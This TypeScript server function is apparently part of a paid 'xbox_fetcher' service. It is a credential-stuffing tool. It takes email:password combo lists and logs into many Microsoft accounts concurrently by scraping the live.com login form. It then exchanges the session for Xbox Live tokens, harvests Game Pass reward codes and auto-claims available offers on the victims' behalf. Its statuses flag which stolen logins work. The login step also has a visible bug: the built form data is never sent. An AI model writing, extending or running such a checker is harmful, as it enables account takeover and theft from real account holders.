import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { firebasePush, firebaseGet, verifyFirebaseIdToken } from "../_shared/firebase-admin.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token",
};
 
 const MICROSOFT_OAUTH_URL = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en';
 
 interface FetchRequest {
   accounts: string[];
   threads?: number;
   username?: string;
 }
 
 interface FetchResult {
   email: string;
   status: 'success' | 'no_codes' | 'auth_failed' | 'login_failed' | 'xbox_tokens_failed' | 'error';
   codes: string[];
   message: string;
 }
 
 class CookieJar {
   private cookies: Map<string, string> = new Map();
 
   extractFromHeaders(headers: Headers): void {
     try {
       const setCookies = (headers as any).getSetCookie?.() || [];
       for (const cookie of setCookies) {
         this.parseCookie(cookie);
       }
     } catch {
       const setCookieHeader = headers.get('set-cookie');
       if (setCookieHeader) {
         const cookies = setCookieHeader.split(/,(?=\s*[^;,]+=[^;,]+)/);
         for (const cookie of cookies) {
           this.parseCookie(cookie);
         }
       }
     }
   }
 
   private parseCookie(cookieStr: string): void {
     const parts = cookieStr.split(';')[0].trim();
     const eqIndex = parts.indexOf('=');
     if (eqIndex > 0) {
       const name = parts.substring(0, eqIndex).trim();
       const value = parts.substring(eqIndex + 1).trim();
       if (name && value) {
         this.cookies.set(name, value);
       }
     }
   }
 
   toString(): string {
     return Array.from(this.cookies.entries())
       .map(([k, v]) => `${k}=${v}`)
       .join('; ');
   }
 }
 
 async function fetchOAuthTokens(cookies: CookieJar): Promise<{ urlPost: string | null; ppft: string | null }> {
   try {
     const headers: Record<string, string> = {
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     };
     
     const cookieStr = cookies.toString();
     if (cookieStr) {
       headers['Cookie'] = cookieStr;
     }
     
     const response = await fetch(MICROSOFT_OAUTH_URL, {
       method: 'GET',
       headers,
     });
     
     cookies.extractFromHeaders(response.headers);
     const text = await response.text();
     
     // Extract PPFT
     let ppftMatch = text.match(/value=\\?"([^"\\]+)\\?"/s) || text.match(/value="([^"]+)"/s);
     const ppft = ppftMatch ? ppftMatch[1] : null;
     
     // Extract urlPost
     let urlPostMatch = text.match(/"urlPost":"([^"]+)"/s) || text.match(/urlPost:'([^']+)'/s);
     const urlPost = urlPostMatch ? urlPostMatch[1].replace(/\\/g, '') : null;
     
     return { urlPost, ppft };
   } catch (e) {
     console.error('fetchOAuthTokens error:', e);
     return { urlPost: null, ppft: null };
   }
 }
 
 async function fetchLogin(email: string, password: string, urlPost: string, ppft: string, cookies: CookieJar): Promise<string | null> {
   try {
     const data = new URLSearchParams({
       'login': email,
       'loginfmt': email,
       'passwd': password,
       'PPFT': ppft,
     });
     
     const response = await fetch(urlPost, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Cookie': cookies.toString(),
       },
       redirect: 'follow',
     });
     
     cookies.extractFromHeaders(response.headers);
     const finalUrl = response.url;
     
     if (finalUrl.includes('#')) {
       const urlObj = new URL(finalUrl);
       const fragment = urlObj.hash.substring(1);
       const params = new URLSearchParams(fragment);
       const accessToken = params.get('access_token');
       if (accessToken && accessToken !== 'None') {
         return accessToken;
       }
     }
     
     return null;
   } catch (e) {
     console.error('fetchLogin error:', e);
     return null;
   }
 }
 
 async function getXboxTokens(rpsToken: string): Promise<{ uhs: string | null; xstsToken: string | null }> {
   try {
     // Get user token
     const userAuthResponse = await fetch('https://user.auth.xboxlive.com/user/authenticate', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'x-xbl-contract-version': '1',
       },
       body: JSON.stringify({
         RelyingParty: 'http://auth.xboxlive.com',
         TokenType: 'JWT',
         Properties: {
           AuthMethod: 'RPS',
           SiteName: 'user.auth.xboxlive.com',
           RpsTicket: rpsToken,
         },
       }),
     });
     
     if (userAuthResponse.status !== 200) {
       console.error('User auth failed:', userAuthResponse.status);
       return { uhs: null, xstsToken: null };
     }
     
     const userAuthData = await userAuthResponse.json();
     const userToken = userAuthData.Token;
     
     if (!userToken) {
       return { uhs: null, xstsToken: null };
     }
     
     // Get XSTS token
     const xstsResponse = await fetch('https://xsts.auth.xboxlive.com/xsts/authorize', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'x-xbl-contract-version': '1',
       },
       body: JSON.stringify({
         RelyingParty: 'http://xboxlive.com',
         TokenType: 'JWT',
         Properties: {
           UserTokens: [userToken],
           SandboxId: 'RETAIL',
         },
       }),
     });
     
     if (xstsResponse.status !== 200) {
       console.error('XSTS auth failed:', xstsResponse.status);
       return { uhs: null, xstsToken: null };
     }
     
     const xstsData = await xstsResponse.json();
     const uhs = xstsData.DisplayClaims?.xui?.[0]?.uhs || null;
     const xstsToken = xstsData.Token || null;
     
     return { uhs, xstsToken };
   } catch (e) {
     console.error('getXboxTokens error:', e);
     return { uhs: null, xstsToken: null };
   }
 }
 
 async function fetchCodesFromXbox(uhs: string, xstsToken: string): Promise<string[]> {
   const codes: string[] = [];
   const auth = `XBL3.0 x=${uhs};${xstsToken}`;
   
   const endpoints = [
     'https://profile.gamepass.com/v2/offers',
     'https://profile.gamepass.com/v2/rewards',
     'https://profile.gamepass.com/v2/promotions',
   ];
   
   for (const endpoint of endpoints) {
     try {
       const response = await fetch(endpoint, {
         method: 'GET',
         headers: {
           'Authorization': auth,
           'Content-Type': 'application/json',
           'User-Agent': 'okhttp/4.12.0',
         },
       });
       
       if (response.status === 200) {
         const data = await response.json();
         
         if (data.offers && Array.isArray(data.offers)) {
           for (const offer of data.offers) {
             const resource = offer.resource;
             if (resource && resource.length > 10) {
               codes.push(resource);
             }
             
             // Try to claim available offers
             if (offer.offerStatus === 'available' && offer.offerId) {
               try {
                 const cv = Array.from({ length: 22 }, () => 
                   'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 62)]
                 ).join('') + '.0';
                 
                 const claimResponse = await fetch(`https://profile.gamepass.com/v2/offers/${offer.offerId}`, {
                   method: 'POST',
                   headers: {
                     'Authorization': auth,
                     'Content-Type': 'application/json',
                     'User-Agent': 'okhttp/4.12.0',
                     'ms-cv': cv,
                     'Content-Length': '0',
                   },
                   body: '',
                 });
                 
                 if (claimResponse.status === 200) {
                   const claimData = await claimResponse.json();
                   const code = claimData.resource;
                   if (code && code.length > 10) {
                     codes.push(code);
                   }
                 }
               } catch (claimError) {
                 console.error('Claim error:', claimError);
               }
             }
           }
         }
       }
     } catch (e) {
       console.error(`Error fetching from ${endpoint}:`, e);
     }
   }
   
   return [...new Set(codes)]; // Remove duplicates
 }
 
 async function fetchAccountWorker(email: string, password: string, idx: number, total: number): Promise<FetchResult> {
   const cookies = new CookieJar();
   
   for (let attempt = 0; attempt < 2; attempt++) {
     try {
       // Step 1: Get OAuth tokens
       const { urlPost, ppft } = await fetchOAuthTokens(cookies);
       
       if (!urlPost || !ppft) {
         if (attempt === 1) {
           return {
             email,
             status: 'auth_failed',
             codes: [],
             message: `[${idx}/${total}] ❌ ${email.substring(0, 20)}... - Auth failed`,
           };
         }
         await new Promise(r => setTimeout(r, 2000));
         continue;
       }
       
       // Step 2: Login
       const rpsToken = await fetchLogin(email, password, urlPost, ppft, cookies);
       
       if (!rpsToken) {
         if (attempt === 1) {
           return {
             email,
             status: 'login_failed',
             codes: [],
             message: `[${idx}/${total}] ❌ ${email.substring(0, 20)}... - Login failed`,
           };
         }
         await new Promise(r => setTimeout(r, 2000));
         continue;
       }
       
       // Step 3: Get Xbox tokens
       const { uhs, xstsToken } = await getXboxTokens(rpsToken);
       
       if (!uhs || !xstsToken) {
         if (attempt === 1) {
           return {
             email,
             status: 'xbox_tokens_failed',
             codes: [],
             message: `[${idx}/${total}] ❌ ${email.substring(0, 20)}... - Xbox tokens failed`,
           };
         }
         await new Promise(r => setTimeout(r, 2000));
         continue;
       }
       
       // Step 4: Fetch codes
       const codes = await fetchCodesFromXbox(uhs, xstsToken);
       
       if (codes.length > 0) {
         return {
           email,
           status: 'success',
           codes,
           message: `[${idx}/${total}] ✅ ${email.substring(0, 20)}... - ${codes.length} codes`,
         };
       } else {
         return {
           email,
           status: 'no_codes',
           codes: [],
           message: `[${idx}/${total}] ⚠️ ${email.substring(0, 20)}... - No codes (working account)`,
         };
       }
     } catch (e) {
       if (attempt === 1) {
         return {
           email,
           status: 'error',
           codes: [],
           message: `[${idx}/${total}] ❌ ${email.substring(0, 20)}... - Error: ${String(e).substring(0, 50)}`,
         };
       }
       await new Promise(r => setTimeout(r, 2000));
     }
   }
   
   return {
     email,
     status: 'error',
     codes: [],
     message: `[${idx}/${total}] ❌ ${email.substring(0, 20)}... - All attempts failed`,
   };
 }
 
 async function processWithWorkerPool<T, R>(
   items: T[],
   concurrency: number,
   fn: (item: T, index: number) => Promise<R>,
   onResult?: (result: R, index: number) => void
 ): Promise<R[]> {
   const results: R[] = new Array(items.length);
   let currentIndex = 0;
   let completedCount = 0;
 
   async function worker(): Promise<void> {
     while (true) {
       const index = currentIndex++;
       if (index >= items.length) break;
       
       try {
         const result = await fn(items[index], index);
         results[index] = result;
         completedCount++;
         
         if (onResult) {
           onResult(result, index);
         }
         
         if (completedCount % 10 === 0) {
           console.log(`Progress: ${completedCount}/${items.length}`);
         }
       } catch (error) {
         results[index] = { error: String(error) } as R;
         completedCount++;
       }
     }
   }
 
   const workers = Array(Math.min(concurrency, items.length))
     .fill(null)
     .map(() => worker());
 
   await Promise.all(workers);
   return results;
 }
 
serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Verify Firebase auth token
    const firebaseToken = req.headers.get("x-firebase-token");
    let userId: string | null = null;
    
    if (firebaseToken) {
      const tokenData = await verifyFirebaseIdToken(firebaseToken);
      if (tokenData) {
        userId = tokenData.uid;
      }
    }

    const { accounts, threads = 5, username }: FetchRequest = await req.json();

    // Check if user has service access
    if (userId) {
      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
      const hasAccess = userData?.services?.includes("xbox_fetcher") || 
                        userData?.services?.includes("all") ||
                        userData?.isAdmin;
      
      if (!hasAccess) {
        return new Response(
          JSON.stringify({ error: "You don't have access to this service" }),
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    console.log(`Starting Xbox fetch for ${accounts.length} accounts, ${threads} threads, user: ${username || 'unknown'}`);

    if (!accounts || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "Accounts are required (email:password format)" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Parse accounts
    const parsedAccounts = accounts.map(acc => {
      const parts = acc.split(':');
      return { email: parts[0]?.trim() || '', password: parts.slice(1).join(':').trim() };
    }).filter(acc => acc.email && acc.password);

    if (parsedAccounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "No valid accounts found. Use email:password format" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const concurrency = Math.min(threads, 20);
    const results = await processWithWorkerPool(
      parsedAccounts,
      concurrency,
      async (acc, idx) => fetchAccountWorker(acc.email, acc.password, idx + 1, parsedAccounts.length)
    );

    console.log(`Fetch complete. Results: ${results.length}`);

    // Calculate stats
    const stats = {
      total: results.length,
      success: results.filter(r => r.status === 'success').length,
      noCodes: results.filter(r => r.status === 'no_codes').length,
      authFailed: results.filter(r => r.status === 'auth_failed').length,
      loginFailed: results.filter(r => r.status === 'login_failed').length,
      xboxFailed: results.filter(r => r.status === 'xbox_tokens_failed').length,
      error: results.filter(r => r.status === 'error').length,
      totalCodes: results.reduce((sum, r) => sum + r.codes.length, 0),
    };

    // Save history to Firebase
    if (userId) {
      await firebasePush(`checkHistory/${userId}`, {
        service: "xbox_fetcher",
        inputCount: accounts.length,
        stats,
        createdAt: new Date().toISOString()
      });
    }

    return new Response(
      JSON.stringify({ results, stats }),
      { 
        status: 200, 
        headers: { ...corsHeaders, "Content-Type": "application/json" } 
      }
    );

  } catch (error) {
    console.error("Error:", error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});